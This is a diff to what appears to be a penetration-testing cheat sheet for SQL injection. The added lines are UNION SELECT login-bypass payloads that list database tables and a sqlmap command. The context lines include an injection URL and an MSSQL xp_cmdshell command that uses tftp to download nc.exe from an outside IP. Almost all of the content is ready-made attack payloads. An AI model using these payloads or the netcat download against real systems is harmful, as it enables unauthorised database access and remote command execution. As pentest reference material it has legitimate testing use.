@@ -79,6 +79,14 @@ http://ptl-544ad5ad-8438986c.libcurl.so/cat.php?id=1 or 1=1 UNION SELECT 1,2,3,4
 Identify number of fields in select: here 1,2,3,4 doesn’t generate error
 
 
+### Get table names
+
+```
+name=a&pass=admin' or 1=1 UNION SELECT 1,2
+name=a&pass=admin' or 1=1 UNION SELECT table_name,table_name FROM information_schema.tables; -- -  
+```
+
+
 ## MySql
 
 ````
@@ -104,3 +112,14 @@ go
 EXEC master..xp_cmdshell 'tftp -i 192.168.168.168 GET nc.exe'
 go
 ````
+
+
+
+## SQLMap
+
+
+Copy Burp request : search-test.txt
+```
+./sqlmap.py -r search-test.txt -p tfUPass
+
+```
